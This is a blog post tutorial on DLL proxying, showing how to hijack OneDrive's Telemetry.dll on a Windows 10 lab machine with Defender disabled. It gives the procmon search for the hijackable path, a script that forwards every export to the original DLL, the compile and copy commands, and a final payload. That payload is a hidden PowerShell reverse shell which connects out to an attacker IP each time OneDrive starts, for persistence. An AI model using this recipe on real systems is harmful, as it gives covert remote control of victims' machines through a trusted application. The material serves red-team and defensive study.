---
layout: post
title: "DLL Proxying example with OneDrive"
---

A few months ago IppSec uploaded [a video](https://www.youtube.com/watch?v=3eROsG_WNpE) about [DLL Hijacking](https://www.okta.com/identity-101/dll-hijacking/) where as one of the examples he [hijacks cscapi.dll used by OneDrive](https://youtu.be/3eROsG_WNpE?t=1075). It's a great video and I'd suggest you to watch it if you are new to the topic but it does not show how to _proxy_ all the functions and data from our dll to a legitimate one. This is necessary if you hijack a dll that is not only loaded but is also actually used by an app.

In this post we will walk through an example of creating a dll that proxies the data and functions using [forwarders](https://devblogs.microsoft.com/oldnewthing/20060719-24/?p=30473) so the app won't crash whenever it tries to use anything exported by the original dll. I will use a kali linux vm and a [windows 10 (MSEdge Developer) vm](https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/) with [VS C++ command-line toolset](https://learn.microsoft.com/en-us/cpp/build/building-on-the-command-line?view=msvc-170#developer_command_prompt_shortcuts) installed and Windows Defender disabled using Group Policy.

**NOTE**: When it comes to proxying, there's a nice [post about it by itm4n](https://itm4n.github.io/dll-proxying/) that also explains how this can be used for privilege escalation. However, it does not show the compilation process and if you want to see how to compile your dll with [VS C++ command-line toolset](https://learn.microsoft.com/en-us/cpp/build/building-on-the-command-line?view=msvc-170#developer_command_prompt_shortcuts) (an installer [here](https://aka.ms/vs/17/release/vs_BuildTools.exe)) to avoid running resource-heavy Visual Studio then stick around :).

# Finding a dll we can hijack

First, let's run [procmon](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon) and set the filter so we can find some locations from which OneDrive attempts to load dlls without success:

```
Process Name     is            OneDrive.exe
Result           is            NAME NOT FOUND
Path             ends with     .dll
```

![procmon filters]({{ "/assets/dll_proxying_filters.png" | relative_url }})

<br>
When we restart OneDrive, we will see that one of the dlls it wants to load is `Telemetry.dll` and the path that fails is `C:\Users\IEUser\AppData\Local\Microsoft\OneDrive\Telemetry.dll`

![procmon Telemetry.dll]({{ "/assets/dll_proxying_telemetry_notfound.png" | relative_url }})

<br>
Now, let's find a path from which `Telemetry.dll` is actually loaded with the following filter:

![procmon Telemetry.dll filters]({{ "/assets/dll_proxying_telemetry_filters.png" | relative_url }})

<br>
After applying it, we'll see that `C:\Users\IEUser\AppData\Local\Microsoft\OneDrive\22.191.0911.0001\Telemetry.dll` is being used.

![procmon Telemetry.dll found]({{ "/assets/dll_proxying_dll_loaded.png" | relative_url }})

Using sysinternals [sigcheck](https://learn.microsoft.com/en-us/sysinternals/downloads/sigcheck) utility we can see that it is a 64-bit dll.

```
C:\Tools>sigcheck64.exe C:\Users\IEUser\AppData\Local\Microsoft\OneDrive\22.191.0911.0001\Telemetry.dll

Sigcheck v2.90 - File version and signature viewer
Copyright (C) 2004-2022 Mark Russinovich
Sysinternals - www.sysinternals.com

c:\users\ieuser\appdata\local\microsoft\onedrive\22.191.0911.0001\Telemetry.dll:
        Verified:       Signed
        Signing date:   11:43 PM 9/11/2022
        Publisher:      Microsoft Corporation
        Company:        Microsoft Corporation
        Description:    Telemetry Library
        Product:        Microsoft OneDrive
        Prod version:   22.191.0911.0001
        File version:   22.191.0911.0001
        MachineType:    64-bit
```
# What happens when we use any dll as `Telemetry.dll`

Just for testing purposes let's see what happens if we use any dll to hijack `Telemetry.dll`. We will save the following C code as `dll.c`:

{% highlight c  linenos %}
#include <windows.h>
#pragma comment(lib, "user32") // for MessageBoxA

DWORD WINAPI ThreadFunc(void* data) {
    MessageBoxA(NULL, "Hi from a malicious dll", "Hi from a malicious dll", 0);
    return 0;
}

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            CloseHandle(CreateThread(NULL, 0, ThreadFunc, NULL, 0, NULL));
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
{% endhighlight %}

This dll will create a thread and show a message box upon being loaded. We will run `x64 Native Tools Command Prompt for VS 2022` and compile our code into `C:\...\OneDrive\Telemetry.dll`.

```
c:\Users\IEUser\dllp>cl dll.c /link /dll /out:C:\Users\IEUser\AppData\Local\Microsoft\OneDrive\Telemetry.dll
Microsoft (R) C/C++ Optimizing Compiler Version 19.33.31630 for x64
Copyright (C) Microsoft Corporation.  All rights reserved.

dll.c
Microsoft (R) Incremental Linker Version 14.33.31630.0
Copyright (C) Microsoft Corporation.  All rights reserved.

/out:dll.exe
/dll
/out:C:\Users\IEUser\AppData\Local\Microsoft\OneDrive\Telemetry.dll
dll.obj
```

After that, when we try to restart OneDrive it will crash until we remove our dll.

```
c:\Users\IEUser\dllp>taskkill /IM "OneDrive.exe" /F
SUCCESS: The process "OneDrive.exe" with PID 4168 has been terminated.

c:\Users\IEUser\dllp>C:\Users\IEUser\AppData\Local\Microsoft\OneDrive\OneDrive.exe

c:\Users\IEUser\dllp>tasklist | findstr OneDrive

c:\Users\IEUser\dllp>del C:\Users\IEUser\AppData\Local\Microsoft\OneDrive\Telemetry.dll

c:\Users\IEUser\dllp>C:\Users\IEUser\AppData\Local\Microsoft\OneDrive\OneDrive.exe

c:\Users\IEUser\dllp>tasklist | findstr OneDrive
OneDrive.exe                  4864 RDP-Tcp#1                  2    126,888 K
```

# Proxying calls into the original `Telemetry.dll`
Let's transfer `Telemetry.dll` to a linux box and take a look at it. What we have to do now is to get a list of all exports of the original `Telemetry.dll` so our dll handles all of them. We can get this list using [pefile](https://github.com/erocarrera/pefile).

```bash
$ python -m pefile exports Telemetry.dll
0x180010790 b'??0AddMountedFolderScenario@QoS@@QEAA@XZ' 1
0x180010910 b'??0AutoMountScenario@QoS@@QEAA@XZ' 2
0x18000f6f0 b'??0CheckQuotaInfoScenario@@QEAA@XZ' 3
0x180010850 b'??0ConnectMountedFolderScenario@QoS@@QEAA@XZ' 4
0x1800194a0 b'??0DownloadScenario@@QEAA@AEBV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@W4DownloadType@@@Z' 5
0x18000fd80 b'??0KFMMigrationScenario@@QEAA@XZ' 6
0x18000fe40 b'??0KFMRestoreScenario@@QEAA@XZ' 7
0x18000fc40 b'??0KFMUXScenario@@QEAA@XZ' 8
0x18000fbc0 b'??0KFMUploadScenario@@QEAA@XZ' 9
0x18000fcc0 b'??0KFMUserInitiatedScanScenario@@QEAA@XZ' 10
0x1800089f0 b'??0QosSyncWrapperConfig@QoS@@QEAA@I_N00PEB_W11@Z' 11
... and a lot more ...
```

And for each of those symbols we would like to _proxy_ them to a copy of the original `Telemetry.dll` named, say, `TelemetryOrig.dll`. We can do this using the [/EXPORT MSVC linker option](https://learn.microsoft.com/en-us/cpp/build/reference/export-exports-a-function?view=msvc-170). For example to proxy `FooFunction` we would use something like:

```
/export:FooFunction=TelemetryOrig.FooFunction
```

We could pass this option on the command line while compiling, but we can also add [the following comment directive](https://learn.microsoft.com/en-us/cpp/build/reference/export-exports-a-function?view=msvc-170#remarks) to our C code:

```c
#pragma comment(linker "/export:FooFunction=TelemetryOrig.FooFunction")
```

Now, let's write a bash script that will read `Telemetry.dll` exports and generate the code with a list of comment directives for each export:


<div class="filename">make_pragmas.sh</div>
{% highlight bash %}
#!/bin/bash

DLL_NAME="TelemetryOrig"
DLL_FILE="Telemetry.dll"

echo '#include <windows.h>'
echo '#pragma comment(lib, "user32") // for MessageBoxA'
echo ''

(IFS='
'
for line in $(python -m pefile exports $DLL_FILE); do
  expname=$(echo $line | cut -f2 -d' ' | sed "s/^b'//" | sed "s/'$//")
  echo "#pragma comment(linker, \"/export:$expname=$DLL_NAME.$expname\")" 
done)

echo '
DWORD WINAPI ThreadFunc(void* data) {
    MessageBoxA(NULL, "Hi from a malicious dll", "Hi from a malicious dll", 0);
    return 0;
}

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            CloseHandle(CreateThread(NULL, 0, ThreadFunc, NULL, 0, NULL));
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
'
{% endhighlight %}

Let's try it:

```bash
$ chmod +x ./make_pragmas.sh
$ ./make_pragmas.sh > dll.c
```

It should generate a file that looks something like:

```c
#include <windows.h>
#pragma comment(lib, "user32") // for MessageBoxA

#pragma comment(linker, "/export:??0AddMountedFolderScenario@QoS@@QEAA@XZ=TelemetryOrig.??0AddMountedFolderScenario@QoS@@QEAA@XZ")
#pragma comment(linker, "/export:??0AutoMountScenario@QoS@@QEAA@XZ=TelemetryOrig.??0AutoMountScenario@QoS@@QEAA@XZ")
#pragma comment(linker, "/export:??0CheckQuotaInfoScenario@@QEAA@XZ=TelemetryOrig.??0CheckQuotaInfoScenario@@QEAA@XZ")
#pragma comment(linker, "/export:??0ConnectMountedFolderScenario@QoS@@QEAA@XZ=TelemetryOrig.??0ConnectMountedFolderScenario@QoS@@QEAA@XZ")
#pragma comment(linker, "/export:??0DownloadScenario@@QEAA@AEBV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@W4DownloadType@@@Z=TelemetryOrig.??0DownloadScenario@@QEAA@AEBV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@W4DownloadType@@@Z")
// ...
#pragma comment(linker, "/export:?UploadScenarioInCurrentTraceReportSuccess@@YAXXZ=TelemetryOrig.?UploadScenarioInCurrentTraceReportSuccess@@YAXXZ")

DWORD WINAPI ThreadFunc(void* data) {
    MessageBoxA(NULL, "Hi from a malicious dll", "Hi from a malicious dll", 0);
    return 0;
}

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            CloseHandle(CreateThread(NULL, 0, ThreadFunc, NULL, 0, NULL));
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

# Trying to hijack the dll again

Now, we will try to compile the generated code on a windows box and see if we will manage to run our simple popup 'payload' without crashing OneDrive. First, let's make sure that OneDrive is not running.

```
c:\>taskkill /IM "OneDrive.exe" /F
SUCCESS: The process "OneDrive.exe" with PID 4864 has been terminated.
```

Then, let's store the original `Telemetry.dll` as `TelemetryOrig.dll` in OneDrive's directory.

```
c:\>copy C:\Users\IEUser\AppData\Local\Microsoft\OneDrive\22.191.0911.0001\Telemetry.dll C:\Users\IEUser\AppData\Local\Microsoft\OneDrive\TelemetryOrig.dll
        1 file(s) copied.

```

And finally we'll compile our new code and start OneDrive.

```
c:\Users\IEUser\dllp>cl dll.c /link /dll /out:C:\Users\IEUser\AppData\Local\Microsoft\OneDrive\Telemetry.dll
Microsoft (R) C/C++ Optimizing Compiler Version 19.33.31630 for x64
Copyright (C) Microsoft Corporation.  All rights reserved.

dll.c
Microsoft (R) Incremental Linker Version 14.33.31630.0
Copyright (C) Microsoft Corporation.  All rights reserved.

/out:dll.exe
/dll
/out:C:\Users\IEUser\AppData\Local\Microsoft\OneDrive\Telemetry.dll
dll.obj
   Creating library C:\Users\IEUser\AppData\Local\Microsoft\OneDrive\Telemetry.lib and object C:\Users\IEUser\AppData\Local\Microsoft\OneDrive\Telemetry.exp

c:\Users\IEUser\dllp>C:\Users\IEUser\AppData\Local\Microsoft\OneDrive\OneDrive.exe
```

This time our MessageBox popup fired and OneDrive did not crash!

![MessageBox fired]({{ "/assets/dll_proxying_popup.png" | relative_url }})

# Trying a different payload

OneDrive starts when user logs in which makes it a good candidate for persistance. Let's try to modify the `ThreadFunc` to give us a reverse shell on OneDrive startup.

I'll run [this popular powershell oneliner](https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3) to get a connection on my linux box (ip: `192.168.10.103` port:`443`).

```c
#include <windows.h>
#include <stdlib.h> // for the system(...) call
// ...
DWORD WINAPI ThreadFunc(void* data) {
    system("powershell -nop -WindowStyle hidden -c \"$client = New-Object System.Net.Sockets.TCPClient('192.168.10.103',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"");
    return 0;
}
// ...
```

Next, I'll recompile the dll and restart the box.

```
c:\Users\IEUser\dllp>taskkill /IM "OneDrive.exe" /F
SUCCESS: The process "OneDrive.exe" with PID 3232 has been terminated.

c:\Users\IEUser\dllp>cl dll.c /link /dll /out:C:\Users\IEUser\AppData\Local\Microsoft\OneDrive\Telemetry.dll
Microsoft (R) C/C++ Optimizing Compiler Version 19.33.31630 for x64
Copyright (C) Microsoft Corporation.  All rights reserved.
...

c:\Users\IEUser\dllp>shutdown /r /t 0
```

On my linux box I start a netcat lister on port 443 and log in to the windows box. After a while I get a connection.

![Powershell rev shell]({{ "/assets/dll_proxying_revshell.png" | relative_url }})

# More Resources
- [Red Teaming Experiments note on DLL Proxying](https://www.ired.team/offensive-security/persistence/dll-proxying-for-persistence)
- [Cihan Solbudak's blog post](https://cihansol.com/blog/index.php/2021/09/14/windows-dll-proxying-hijacking/)